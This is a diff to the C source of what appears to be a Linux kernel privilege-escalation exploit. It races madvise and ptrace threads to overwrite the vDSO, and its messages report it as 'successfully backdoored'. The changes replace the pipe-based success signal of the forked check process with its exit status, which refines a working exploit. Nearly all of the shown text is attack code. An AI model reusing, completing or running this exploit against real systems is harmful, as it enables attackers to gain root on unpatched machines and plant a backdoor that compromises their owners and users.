@@ -291,30 +291,28 @@ static int restore_vdso(pid_t pid, unsigned int patch_number)
 
 /*
  * Check if vDSO is entirely patched. This function is executed in a different
- * memory space because of fork(). The parent is notified thanks to the pipe.
+ * memory space thanks to fork(). Return 0 on success, 1 otherwise.
  */
-static int check(struct mem_arg *arg, int pipe)
+static void check(struct mem_arg *arg)
 {
 	struct vdso_patch *p;
 	void *src;
-	char c;
-	int i;
+	int i, ret;
 
 	p = &vdso_patch[arg->patch_number];
 	src = arg->do_patch ? p->patch : p->copy;
 
+	ret = 1;
 	for (i = 0; i < LOOP; i++) {
 		if (memcmp(p->addr, src, p->size) == 0) {
-			c = '!';
-			if (writeall(pipe, &c, sizeof(c)) == -1)
-				return -1;
-			return 0;
+			ret = 0;
+			break;
 		}
 
 		usleep(100);
 	}
 
-	return 1;
+	exit(ret);
 }
 
 static void *madviseThread(void *arg_)
@@ -392,45 +390,30 @@ static void *ptrace_thread(void *arg_)
 static int exploit_helper(struct mem_arg *arg)
 {
 	pthread_t pth1, pth2;
+	int ret, status;
 	pid_t pid;
-	int fd[2];
-	int ret;
-	char c;
 
 	fprintf(stderr, "[*] %s: patch %d/%ld\n",
 		arg->do_patch ? "exploit" : "restore",
 		arg->patch_number + 1,
 		ARRAY_SIZE(vdso_patch));
 
-	if (pipe(fd) == -1) {
-		warn("pipe");
-		return -1;
-	}
-
 	/* run "check" in a different memory space */
 	pid = fork();
 	if (pid == -1) {
 		warn("fork");
-		close(fd[0]);
-		close(fd[1]);
 		return -1;
 	} else if (pid == 0) {
-		close(fd[0]);
-		ret = check(arg, fd[1]);
-		close(fd[1]);
-		exit(ret);
+		check(arg);
 	}
-
-	close(fd[1]);
 
 	arg->stop = false;
 	pthread_create(&pth1, NULL, madviseThread, arg);
 	pthread_create(&pth2, NULL, ptrace_thread, arg);
 
 	/* wait for "check" process */
-	if (waitpid(pid, NULL, 0) == -1) {
+	if (waitpid(pid, &status, 0) == -1) {
 		warn("waitpid");
-		close(fd[0]);
 		return -1;
 	}
 
@@ -440,16 +423,13 @@ static int exploit_helper(struct mem_arg *arg)
 	pthread_join(pth2, NULL);
 
 	/* check result */
-	if (read(fd[0], &c, sizeof(c)) == sizeof(c)) {
+	ret = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
+	if (ret == 0) {
 		fprintf(stderr, "[*] vdso successfully %s\n",
 			arg->do_patch ? "backdoored" : "restored");
-		ret = 0;
 	} else {
 		fprintf(stderr, "[-] failed to win race condition...\n");
-		ret = -1;
 	}
-
-	close(fd[0]);
 
 	return ret;
 }
@@ -475,7 +455,7 @@ static int exploit(struct mem_arg *arg, bool do_patch)
 		else
 			arg->patch_number = ARRAY_SIZE(vdso_patch) - i - 1;
 
-		if (exploit_helper(arg) == -1) {
+		if (exploit_helper(arg) != 0) {
 			ret = -1;
 			break;
 		}
